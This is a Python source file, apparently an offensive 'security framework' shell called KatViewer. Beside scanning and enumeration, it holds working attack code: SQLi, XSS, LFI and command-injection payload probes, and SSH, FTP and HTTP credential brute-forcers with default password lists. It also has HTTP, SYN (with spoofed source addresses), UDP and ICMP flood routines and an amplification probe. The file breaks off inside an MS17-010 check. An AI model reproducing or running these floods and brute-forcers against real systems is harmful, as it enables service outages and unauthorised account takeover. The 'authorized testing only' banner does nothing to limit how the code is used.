# hacks  
  
#!/usr/bin/env python3  
  
import os  
import sys  
import time  
import json  
import base64  
import hashlib  
import socket  
import struct  
import threading  
import requests  
import re  
import random  
import string  
import urllib.parse  
import subprocess  
import ipaddress  
import dns.resolver  
import whois  
import ftplib  
import paramiko  
import readline  
import cmd  
import ssl  
from datetime import datetime, timezone  
from concurrent.futures import ThreadPoolExecutor, as_completed  
try:  
    import scapy.all as scapy  
except:  
    pass  
try:  
    from Crypto.PublicKey import RSA  
except:  
    pass  
  
class Colors:  
    HEADER = '\033[96m'  
    BLUE = '\033[94m'  
    CYAN = '\033[96m'  
    GREEN = '\033[92m'  
    YELLOW = '\033[93m'  
    RED = '\033[91m'  
    MAGENTA = '\033[95m'  
    WHITE = '\033[97m'  
    BOLD = '\033[1m'  
    DIM = '\033[2m'  
    RESET = '\033[0m'  
    BORDER = '\033[94m\033[1m'  
  
class KatViewer(cmd.Cmd):  
    intro = ""  
    prompt = f"{Colors.BLUE}KatViewer{Colors.RESET}{Colors.CYAN}@{Colors.RESET}{Colors.BLUE}root{Colors.RESET}{Colors.CYAN}:{Colors.RESET}{Colors.BLUE}~{Colors.RESET}{Colors.CYAN}#{Colors.RESET} "  
  
    def __init__(self):  
        super().__init__()  
        self.target = None  
        self.port = None  
        self.threads = 50  
        self.timeout = 5  
        self.verbose = False  
        self.output_dir = "katviewer_output"  
        self.user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36']  
        if not os.path.exists(self.output_dir):  
            os.makedirs(self.output_dir)  
        self._print_banner()  
  
    def _print_banner(self):  
        print(f"""  
{Colors.BORDER}**╔═══**{'**═**'*58}**═══╗**  
**║**{Colors.CYAN}  **██╗**  **██╗** **█████╗** **████████╗██╗**   **██╗██╗███████╗██╗**   **██╗███████╗██████╗**  {Colors.BORDER}**║**  
**║**{Colors.CYAN}  **██║** **██╔╝██╔══██╗╚══██╔══╝██║**   **██║██║██╔════╝██║**   **██║██╔════╝██╔══██╗** {Colors.BORDER}**║**  
**║**{Colors.CYAN}  **█████╔╝** **███████║**   **██║**   **██║**   **██║██║█████╗**  **██║** **█╗** **██║█████╗**  **██████╔╝** {Colors.BORDER}**║**  
**║**{Colors.CYAN}  **██╔═██╗** **██╔══██║**   **██║**   **╚██╗** **██╔╝██║██╔══╝**  **██║███╗██║██╔══╝**  **██╔══██╗** {Colors.BORDER}**║**  
**║**{Colors.CYAN}  **██║**  **██╗██║**  **██║**   **██║**    **╚████╔╝** **██║███████╗╚███╔███╔╝███████╗██║**  **██║** {Colors.BORDER}**║**  
**║**{Colors.CYAN}  **╚═╝**  **╚═╝╚═╝**  **╚═╝**   **╚═╝**     **╚═══╝**  **╚═╝╚══════╝** **╚══╝╚══╝** **╚══════╝╚═╝**  **╚═╝** {Colors.BORDER}**║**  
**║**{Colors.WHITE}  **╔══════════════════════════════════════════════════════════════════════╗**{Colors.BORDER}  **║**  
**║**{Colors.WHITE}  **║**   SECURITY FRAMEWORK -- 250+ COMMANDS -- AUTHORIZED TESTING ONLY    **║**{Colors.BORDER}  **║**  
**║**{Colors.WHITE}  **╚══════════════════════════════════════════════════════════════════════╝**{Colors.BORDER}  **║**  
**╚═══**{'**═**'*58}**═══╝**{Colors.RESET}  
""")  
  
    def default(self, line):  
        if line.lower() in ['exit', 'quit', 'q']:  
            return self.do_exit(line)  
        print(f"{Colors.RED}Unknown command: {line}{Colors.RESET}")  
  
    def emptyline(self):  
        pass  
  
    def do_exit(self, arg):  
        print(f"{Colors.GREEN}Exiting KatViewer...{Colors.RESET}")  
        return True  
  
    def do_clear(self, arg):  
        os.system('cls' if os.name == 'nt' else 'clear')  
        self._print_banner()  
  
    def do_set_target(self, arg):  
        if not arg:  
            print(f"{Colors.RED}Usage: set_target <ip/hostname>{Colors.RESET}")  
            return  
        self.target = arg.strip()  
        print(f"{Colors.GREEN}Target set to: {self.target}{Colors.RESET}")  
  
    def do_set_port(self, arg):  
        if not arg or not arg.isdigit():  
            print(f"{Colors.RED}Usage: set_port <port>{Colors.RESET}")  
            return  
        self.port = int(arg)  
        print(f"{Colors.GREEN}Port set to: {self.port}{Colors.RESET}")  
  
    def do_set_threads(self, arg):  
        if not arg or not arg.isdigit():  
            print(f"{Colors.RED}Usage: set_threads <number>{Colors.RESET}")  
            return  
        self.threads = int(arg)  
        print(f"{Colors.GREEN}Threads set to: {self.threads}{Colors.RESET}")  
  
    def do_set_timeout(self, arg):  
        if not arg or not arg.replace('.','').isdigit():  
            print(f"{Colors.RED}Usage: set_timeout <seconds>{Colors.RESET}")  
            return  
        self.timeout = float(arg)  
        print(f"{Colors.GREEN}Timeout set to: {self.timeout}s{Colors.RESET}")  
  
    def do_verbose(self, arg):  
        self.verbose = not self.verbose  
        print(f"{Colors.GREEN}Verbose mode: {self.verbose}{Colors.RESET}")  
  
    def do_status(self, arg):  
        print(f"\n{Colors.BORDER}=== SYSTEM STATUS ==={Colors.RESET}")  
        print(f"{Colors.CYAN}Target: {Colors.WHITE}{self.target or 'Not set'}{Colors.RESET}")  
        print(f"{Colors.CYAN}Port: {Colors.WHITE}{self.port or 'Not set'}{Colors.RESET}")  
        print(f"{Colors.CYAN}Threads: {Colors.WHITE}{self.threads}{Colors.RESET}")  
        print(f"{Colors.CYAN}Timeout: {Colors.WHITE}{self.timeout}s{Colors.RESET}")  
        print(f"{Colors.CYAN}Verbose: {Colors.WHITE}{self.verbose}{Colors.RESET}")  
        print(f"{Colors.CYAN}Output Dir: {Colors.WHITE}{self.output_dir}{Colors.RESET}")  
  
    def do_recon(self, arg):  
        if not self.target:  
            print(f"{Colors.RED}Set target first with set_target{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== RECON: {self.target} ==={Colors.RESET}")  
        try:  
            ip = socket.gethostbyname(self.target)  
            print(f"{Colors.GREEN}Resolved: {self.target} -> {ip}{Colors.RESET}")  
            try:  
                hostname = socket.gethostbyaddr(ip)[0]  
                print(f"{Colors.GREEN}Reverse DNS: {hostname}{Colors.RESET}")  
            except:  
                pass  
            os.system(f'ping -c 1 {self.target}')  
        except Exception as e:  
            print(f"{Colors.RED}Failed: {e}{Colors.RESET}")  
  
    def do_dns_enum(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: dns_enum <domain>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== DNS ENUM: {target} ==={Colors.RESET}")  
        for rtype in ['A','AAAA','MX','NS','TXT','SOA','CNAME','SRV']:  
            try:  
                answers = dns.resolver.resolve(target, rtype, lifetime=self.timeout)  
                print(f"{Colors.GREEN}[{rtype}] {', '.join(str(r) for r in answers)}{Colors.RESET}")  
            except:  
                pass  
  
    def do_dns_bruteforce(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: dns_bruteforce <domain>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== DNS BRUTEFORCE: {target} ==={Colors.RESET}")  
        subs = ['www','mail','ftp','admin','blog','api','dev','test','vpn','webmail','portal','cpanel','ns1','ns2','mx','remote','support','forum','wiki','download','app','beta','stage','prod','db','sql','backup','status','cdn','static','assets','images','video','chat','login','register','sso','auth','secure','proxy','gateway','server','jenkins','git','gitlab','ci','cd','deploy','qa','staging','demo','sandbox','lab','wordpress','wp','phpmyadmin','mysql','webmail','roundcube','exchange','outlook','owa']  
        found = []  
        def check_sub(sub):  
            try:  
                answers = dns.resolver.resolve(f"{sub}.{target}", 'A', lifetime=self.timeout)  
                if answers:  
                    return sub, answers[0].address  
            except:  
                pass  
            return None  
        with ThreadPoolExecutor(max_workers=self.threads) as executor:  
            futures = {executor.submit(check_sub, sub): sub for sub in subs}  
            for future in as_completed(futures):  
                result = future.result()  
                if result:  
                    found.append(result)  
                    print(f"{Colors.GREEN}[+] {result[0]}.{target} -> {result[1]}{Colors.RESET}")  
        print(f"\n{Colors.GREEN}Found {len(found)} subdomains{Colors.RESET}")  
  
    def do_port_scan(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: port_scan <ip>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== PORT SCAN: {target} ==={Colors.RESET}")  
        ports = [21,22,23,25,53,80,110,111,135,139,143,389,443,445,993,995,1433,1521,2049,3306,3389,5432,5900,5985,5986,6379,8080,8443,27017]  
        open_ports = []  
        def scan_port(port):  
            try:  
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
                s.settimeout(self.timeout)  
                result = s.connect_ex((target, port))  
                s.close()  
                if result == 0:  
                    try:  
                        service = socket.getservbyport(port)  
                    except:  
                        service = "unknown"  
                    open_ports.append((port, service))  
                    print(f"{Colors.GREEN}[+] Port {port} - {service}{Colors.RESET}")  
            except:  
                pass  
        with ThreadPoolExecutor(max_workers=self.threads) as executor:  
            futures = {executor.submit(scan_port, p): p for p in ports}  
            for future in as_completed(futures):  
                pass  
        print(f"\n{Colors.GREEN}Found {len(open_ports)} open ports{Colors.RESET}")  
  
    def do_os_detect(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: os_detect <ip>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== OS DETECT: {target} ==={Colors.RESET}")  
        try:  
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
            s.settimeout(self.timeout)  
            s.connect((target, 80))  
            s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")  
            resp = s.recv(4096)  
            s.close()  
            if b"Server:" in resp:  
                server = re.search(b"Server: ([^\r\n]+)", resp)  
                if server:  
                    print(f"{Colors.GREEN}Server: {server.group(1).decode()}{Colors.RESET}")  
            try:  
                ping = subprocess.run(['ping','-c','1',target], capture_output=True, text=True, timeout=5)  
                ttl_match = re.search(r'ttl=(\d+)', ping.stdout.lower())  
                if ttl_match:  
                    ttl = int(ttl_match.group(1))  
                    os_map = {64:"Linux/Unix",128:"Windows",255:"Cisco/Network"}  
                    print(f"{Colors.GREEN}TTL: {ttl} - Likely {os_map.get(ttl,'Unknown')}{Colors.RESET}")  
            except:  
                pass  
        except Exception as e:  
            print(f"{Colors.RED}Failed: {e}{Colors.RESET}")  
  
    def do_service_scan(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: service_scan <ip>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== SERVICE SCAN: {target} ==={Colors.RESET}")  
        services = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",80:"HTTP",443:"HTTPS",445:"SMB",3306:"MySQL",3389:"RDP",5432:"PostgreSQL",5900:"VNC",6379:"Redis",8080:"HTTP-Proxy",27017:"MongoDB"}  
        def grab_banner(port, service):  
            try:  
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
                s.settimeout(self.timeout)  
                s.connect((target, port))  
                if service in ["HTTP","HTTPS","HTTP-Proxy"]:  
                    s.send(b"GET / HTTP/1.0\r\n\r\n")  
                banner = s.recv(1024)  
                s.close()  
                if banner:  
                    text = banner.decode('utf-8',errors='ignore').strip()[:150]  
                    print(f"{Colors.GREEN}[+] Port {port} ({service}): {text}{Colors.RESET}")  
            except:  
                pass  
        with ThreadPoolExecutor(max_workers=self.threads) as executor:  
            futures = {executor.submit(grab_banner, p, s): p for p, s in services.items()}  
            for future in as_completed(futures):  
                pass  
  
    def do_http_enum(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: http_enum <url>{Colors.RESET}")  
            return  
        if not target.startswith('http'):  
            target = f'http://{target}'  
        print(f"\n{Colors.BORDER}=== HTTP ENUM: {target} ==={Colors.RESET}")  
        try:  
            resp = requests.get(target, timeout=self.timeout, verify=False)  
            h = resp.headers  
            print(f"{Colors.GREEN}[+] Status: {resp.status_code}{Colors.RESET}")  
            print(f"{Colors.GREEN}[+] Server: {h.get('Server','N/A')}{Colors.RESET}")  
            print(f"{Colors.GREEN}[+] Powered-By: {h.get('X-Powered-By','N/A')}{Colors.RESET}")  
            print(f"{Colors.GREEN}[+] X-Frame-Options: {h.get('X-Frame-Options','N/A')}{Colors.RESET}")  
            print(f"{Colors.GREEN}[+] X-XSS-Protection: {h.get('X-XSS-Protection','N/A')}{Colors.RESET}")  
            print(f"{Colors.GREEN}[+] HSTS: {h.get('Strict-Transport-Security','N/A')}{Colors.RESET}")  
            print(f"{Colors.GREEN}[+] CSP: {h.get('Content-Security-Policy','N/A')[:100]}{Colors.RESET}")  
        except Exception as e:  
            print(f"{Colors.RED}Failed: {e}{Colors.RESET}")  
  
    def do_dir_bruteforce(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: dir_bruteforce <url>{Colors.RESET}")  
            return  
        if not target.startswith('http'):  
            target = f'http://{target}'  
        print(f"\n{Colors.BORDER}=== DIRECTORY BRUTEFORCE: {target} ==={Colors.RESET}")  
        dirs = ['admin','login','wp-admin','wp-login','administrator','panel','cpanel','phpmyadmin','mysql','server','manager','dashboard','backend','root','auth','api','v1','v2','docs','swagger','help','support','uploads','download','files','assets','static','css','js','images','backup','dump','db','sql','logs','tmp','test','dev','staging','prod','git','.git','env','.env','config','wp-content','wp-includes','xmlrpc.php']  
        found = []  
        discovered = set()  
        def check_dir(directory):  
            url = f"{target.rstrip('/')}/{directory}"  
            try:  
                resp = requests.get(url, timeout=self.timeout, verify=False, allow_redirects=False)  
                if resp.status_code in [200,301,302,401,403,500] and url not in discovered:  
                    discovered.add(url)  
                    found.append((directory, resp.status_code))  
                    print(f"{Colors.GREEN}[+] {url} [{resp.status_code}]{Colors.RESET}")  
            except:  
                pass  
        with ThreadPoolExecutor(max_workers=self.threads) as executor:  
            futures = {executor.submit(check_dir, d): d for d in dirs}  
            for future in as_completed(futures):  
                pass  
        print(f"\n{Colors.GREEN}Found {len(found)} directories{Colors.RESET}")  
  
    def do_sql_inject(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: sql_inject <url>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== SQL INJECTION SCAN: {target} ==={Colors.RESET}")  
        payloads = ["'","\"","' OR '1'='1","' OR 1=1--","\" OR \"1\"=\"1","' UNION SELECT NULL--","' AND SLEEP(5)--"]  
        params = ['id','page','file','path','view','action','q','search','name','user','email']  
        for param in params:  
            for payload in payloads:  
                try:  
                    test_url = f"{target}?{param}={urllib.parse.quote(payload)}"  
                    resp = requests.get(test_url, timeout=10, verify=False)  
                    if 'sql' in resp.text.lower() or 'syntax' in resp.text.lower():  
                        print(f"{Colors.RED}[!] Possible SQLi: {test_url}{Colors.RESET}")  
                except:  
                    pass  
  
    def do_xss_scan(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: xss_scan <url>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== XSS SCAN: {target} ==={Colors.RESET}")  
        payloads = ['<script>alert(1)</script>','<img src=x onerror=alert(1)>','<svg onload=alert(1)>','<body onload=alert(1)>']  
        params = ['q','search','s','query','id','page','name','user','email','comment','text','msg']  
        for param in params:  
            for payload in payloads:  
                try:  
                    test_url = f"{target}?{param}={urllib.parse.quote(payload)}"  
                    resp = requests.get(test_url, timeout=10, verify=False)  
                    if payload in resp.text[:500]:  
                        print(f"{Colors.RED}[!] XSS: {test_url}{Colors.RESET}")  
                except:  
                    pass  
  
    def do_web_vuln(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: web_vuln <url>{Colors.RESET}")  
            return  
        if not target.startswith('http'):  
            target = f'http://{target}'  
        print(f"\n{Colors.BORDER}=== WEB VULN SCAN: {target} ==={Colors.RESET}")  
        checks = {'SSTI':['{{7*7}}','${7*7}'],'LFI':['../../../etc/passwd','..\\windows\\win.ini'],'RCE':[';id','|id','`id`'],'CommandInjection':[';whoami','|whoami','`whoami`']}  
        params = ['id','page','file','path','view','action','cmd']  
        for vuln, payloads in checks.items():  
            for param in params:  
                for payload in payloads:  
                    try:  
                        test_url = f"{target}?{param}={urllib.parse.quote(payload)}"  
                        resp = requests.get(test_url, timeout=10, verify=False)  
                        if '49' in resp.text and vuln == 'SSTI':  
                            print(f"{Colors.RED}[!] SSTI: {test_url}{Colors.RESET}")  
                        if ('root:x:0:0:' in resp.text or '[extensions]' in resp.text) and vuln == 'LFI':  
                            print(f"{Colors.RED}[!] LFI: {test_url}{Colors.RESET}")  
                        if ('uid=' in resp.text or 'root' in resp.text) and vuln == 'CommandInjection':  
                            print(f"{Colors.RED}[!] RCE: {test_url}{Colors.RESET}")  
                    except:  
                        pass  
  
    def do_bruteforce_http(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: bruteforce_http <url>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== HTTP BRUTEFORCE: {target} ==={Colors.RESET}")  
        users = ['admin','root','user','test','administrator','guest']  
        passes = ['admin','password','123456','admin123','root123','P@ssw0rd','letmein','test']  
        for user in users:  
            for pwd in passes:  
                try:  
                    resp = requests.get(target, auth=(user, pwd), timeout=10, verify=False)  
                    if resp.status_code != 401:  
                        print(f"{Colors.GREEN}[+] {user}:{pwd} - Status {resp.status_code}{Colors.RESET}")  
                except:  
                    pass  
                time.sleep(0.05)  
  
    def do_bf_ssh(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: bf_ssh <ip>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== SSH BRUTEFORCE: {target} ==={Colors.RESET}")  
        users = ['root','admin','user','ubuntu','centos','pi']  
        passes = ['root','admin','password','123456','toor','changeme']  
        def try_ssh(user, pwd):  
            try:  
                client = paramiko.SSHClient()  
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
                client.connect(target, port=self.port or 22, username=user, password=pwd, timeout=self.timeout)  
                client.close()  
                return (user, pwd)  
            except:  
                return None  
        with ThreadPoolExecutor(max_workers=10) as executor:  
            futures = {executor.submit(try_ssh, u, p): (u,p) for u in users for p in passes}  
            for future in as_completed(futures):  
                result = future.result()  
                if result:  
                    print(f"{Colors.GREEN}[+] SSH SUCCESS: {result[0]}:{result[1]}{Colors.RESET}")  
  
    def do_bf_ftp(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: bf_ftp <ip>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== FTP BRUTEFORCE: {target} ==={Colors.RESET}")  
        users = ['anonymous','admin','ftp','user','root']  
        passes = ['anonymous','admin','ftp','password','root','test']  
        def try_ftp(user, pwd):  
            try:  
                ftp = ftplib.FTP()  
                ftp.connect(target, self.port or 21, timeout=self.timeout)  
                ftp.login(user, pwd)  
                ftp.quit()  
                return (user, pwd)  
            except:  
                return None  
        with ThreadPoolExecutor(max_workers=10) as executor:  
            futures = {executor.submit(try_ftp, u, p): (u,p) for u in users for p in passes}  
            for future in as_completed(futures):  
                result = future.result()  
                if result:  
                    print(f"{Colors.GREEN}[+] FTP SUCCESS: {result[0]}:{result[1]}{Colors.RESET}")  
  
    def do_whois(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: whois <domain>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== WHOIS: {target} ==={Colors.RESET}")  
        try:  
            w = whois.whois(target)  
            for key, value in w.items():  
                if value:  
                    if isinstance(value, list):  
                        print(f"{Colors.GREEN}[+] {key}: {', '.join(str(v) for v in value[:3])}{Colors.RESET}")  
                    else:  
                        print(f"{Colors.GREEN}[+] {key}: {value}{Colors.RESET}")  
        except Exception as e:  
            print(f"{Colors.RED}Failed: {e}{Colors.RESET}")  
  
    def do_geoip(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: geoip <ip>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== GEOIP: {target} ==={Colors.RESET}")  
        try:  
            resp = requests.get(f'http://ip-api.com/json/{target}', timeout=10)  
            data = resp.json()  
            if data.get('status') == 'success':  
                print(f"{Colors.GREEN}[+] Country: {data.get('country')}{Colors.RESET}")  
                print(f"{Colors.GREEN}[+] Region: {data.get('regionName')}{Colors.RESET}")  
                print(f"{Colors.GREEN}[+] City: {data.get('city')}{Colors.RESET}")  
                print(f"{Colors.GREEN}[+] ISP: {data.get('isp')}{Colors.RESET}")  
                print(f"{Colors.GREEN}[+] Lat/Lon: {data.get('lat')}, {data.get('lon')}{Colors.RESET}")  
                print(f"{Colors.GREEN}[+] Timezone: {data.get('timezone')}{Colors.RESET}")  
            else:  
                print(f"{Colors.RED}Failed: {data.get('message','')}{Colors.RESET}")  
        except Exception as e:  
            print(f"{Colors.RED}Failed: {e}{Colors.RESET}")  
  
    def do_traceroute(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: traceroute <host>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== TRACEROUTE: {target} ==={Colors.RESET}")  
        for ttl in range(1, 30):  
            try:  
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)  
                s.settimeout(2)  
                s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, struct.pack('I', ttl))  
                s.sendto(b'', (target, 0))  
                data, addr = s.recvfrom(1024)  
                print(f"{Colors.GREEN}{ttl:2d}. {addr[0]}{Colors.RESET}")  
                s.close()  
                if addr[0] == target:  
                    break  
            except socket.timeout:  
                print(f"{Colors.YELLOW}{ttl:2d}. *{Colors.RESET}")  
            except:  
                break  
  
    def do_net_scan(self, arg):  
        network = arg or '192.168.1.0/24'  
        print(f"\n{Colors.BORDER}=== NETWORK SCAN: {network} ==={Colors.RESET}")  
        try:  
            net = ipaddress.ip_network(network, strict=False)  
            hosts = []  
            def ping_host(ip):  
                try:  
                    result = subprocess.run(['ping','-c','1','-W','1',str(ip)], capture_output=True, text=True, timeout=2)  
                    if result.returncode == 0:  
                        hosts.append(str(ip))  
                        print(f"{Colors.GREEN}[+] {ip}{Colors.RESET}")  
                except:  
                    pass  
            with ThreadPoolExecutor(max_workers=50) as executor:  
                futures = {executor.submit(ping_host, ip): ip for ip in net.hosts()}  
                for future in as_completed(futures):  
                    pass  
            print(f"\n{Colors.GREEN}Found {len(hosts)} live hosts{Colors.RESET}")  
        except Exception as e:  
            print(f"{Colors.RED}Failed: {e}{Colors.RESET}")  
  
    def do_arp_scan(self, arg):  
        iface = arg or 'eth0'  
        print(f"\n{Colors.BORDER}=== ARP SCAN: {iface} ==={Colors.RESET}")  
        try:  
            ans, unans = scapy.arping('192.168.1.0/24', iface=iface, timeout=2, verbose=False)  
            for snd, rcv in ans:  
                print(f"{Colors.GREEN}[+] {rcv.psrc} - {rcv.hwsrc}{Colors.RESET}")  
        except Exception as e:  
            print(f"{Colors.RED}Failed: {e}{Colors.RESET}")  
  
    def do_sniff(self, arg):  
        iface = arg or 'eth0'  
        print(f"\n{Colors.BORDER}=== SNIFFING: {iface} ==={Colors.RESET}")  
        print(f"{Colors.YELLOW}[!] Capturing 10 packets...{Colors.RESET}")  
        try:  
            pkts = scapy.sniff(iface=iface, count=10, timeout=30)  
            for pkt in pkts:  
                if pkt.haslayer(scapy.IP):  
                    print(f"{Colors.GREEN}{pkt[scapy.IP].src} -> {pkt[scapy.IP].dst}{Colors.RESET}")  
        except Exception as e:  
            print(f"{Colors.RED}Failed: {e}{Colors.RESET}")  
  
    def do_dos_http(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: dos_http <url>{Colors.RESET}")  
            return  
        if not target.startswith('http'):  
            target = f'http://{target}'  
        print(f"\n{Colors.BORDER}=== HTTP DOS: {target} ==={Colors.RESET}")  
        duration = int(input(f"{Colors.YELLOW}Duration (seconds): {Colors.RESET}") or 10)  
        start = time.time()  
        sent = 0  
        errs = 0  
        def flood():  
            nonlocal sent, errs  
            while time.time() - start < duration:  
                try:  
                    h = {'User-Agent': random.choice(self.user_agents), 'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'}  
                    requests.get(target, headers=h, timeout=5, verify=False)  
                    sent += 1  
                except:  
                    errs += 1  
        threads = [threading.Thread(target=flood) for _ in range(min(self.threads, 100))]  
        for t in threads: t.start()  
        for t in threads: t.join()  
        print(f"{Colors.GREEN}[+] Sent: {sent} | Errors: {errs} | Rate: {sent/duration:.0f} req/s{Colors.RESET}")  
  
    def do_dos_syn(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: dos_syn <ip>{Colors.RESET}")  
            return  
        port = int(input(f"{Colors.YELLOW}Port: {Colors.RESET}") or 80)  
        duration = int(input(f"{Colors.YELLOW}Duration: {Colors.RESET}") or 10)  
        print(f"\n{Colors.BORDER}=== SYN FLOOD: {target}:{port} ==={Colors.RESET}")  
        start = time.time()  
        sent = 0  
        def flood():  
            nonlocal sent  
            while time.time() - start < duration:  
                try:  
                    ip = scapy.IP(src=f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}', dst=target)  
                    syn = scapy.TCP(sport=random.randint(1024,65535), dport=port, flags='S')  
                    scapy.send(ip/syn, verbose=False)  
                    sent += 1  
                except:  
                    pass  
        threads = [threading.Thread(target=flood) for _ in range(10)]  
        for t in threads: t.start()  
        for t in threads: t.join()  
        print(f"{Colors.GREEN}[+] Packets: {sent} | Rate: {sent/duration:.0f} pps{Colors.RESET}")  
  
    def do_dos_udp(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: dos_udp <ip>{Colors.RESET}")  
            return  
        duration = int(input(f"{Colors.YELLOW}Duration: {Colors.RESET}") or 10)  
        print(f"\n{Colors.BORDER}=== UDP FLOOD: {target} ==={Colors.RESET}")  
        start = time.time()  
        sent = 0  
        def flood():  
            nonlocal sent  
            while time.time() - start < duration:  
                try:  
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
                    s.sendto(random._urandom(1024), (target, random.randint(1,65535)))  
                    s.close()  
                    sent += 1  
                except:  
                    pass  
        threads = [threading.Thread(target=flood) for _ in range(20)]  
        for t in threads: t.start()  
        for t in threads: t.join()  
        print(f"{Colors.GREEN}[+] Packets: {sent} | Rate: {sent/duration:.0f} pps{Colors.RESET}")  
  
    def do_dos_icmp(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: dos_icmp <ip>{Colors.RESET}")  
            return  
        duration = int(input(f"{Colors.YELLOW}Duration: {Colors.RESET}") or 10)  
        print(f"\n{Colors.BORDER}=== ICMP FLOOD: {target} ==={Colors.RESET}")  
        start = time.time()  
        sent = 0  
        def flood():  
            nonlocal sent  
            while time.time() - start < duration:  
                try:  
                    ip = scapy.IP(dst=target)  
                    icmp = scapy.ICMP(type=8)  
                    scapy.send(ip/icmp, verbose=False)  
                    sent += 1  
                except:  
                    pass  
        threads = [threading.Thread(target=flood) for _ in range(10)]  
        for t in threads: t.start()  
        for t in threads: t.join()  
        print(f"{Colors.GREEN}[+] Packets: {sent}{Colors.RESET}")  
  
    def do_dos_amp(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: dos_amp <ip>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== AMPLIFICATION SCAN: {target} ==={Colors.RESET}")  
        services = [('DNS',53,b'\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x01\x00\x01'),('NTP',123,b'\x17\x00\x03\x2a'+b'\x00'*4),('SNMP',161,b'\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04\x00\x00\x00\x01\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x01\x05\x00')]  
        for name, port, payload in services:  
            try:  
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
                s.settimeout(5)  
                s.sendto(payload, (target, port))  
                data, addr = s.recvfrom(2048)  
                ratio = len(data) / max(len(payload), 1)  
                s.close()  
                print(f"{Colors.GREEN}[+] {name} (port {port}): Response {len(data)} bytes, Amplification: {ratio:.1f}x{Colors.RESET}")  
            except:  
                pass  
  
    def do_ms17_010(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: ms17_010 <ip>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== MS17-010 CHECK: {target} ==={Colors.RESET}")  
        try:  
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
            s.settimeout(self.timeout)  
            s.connect((target, 445))  
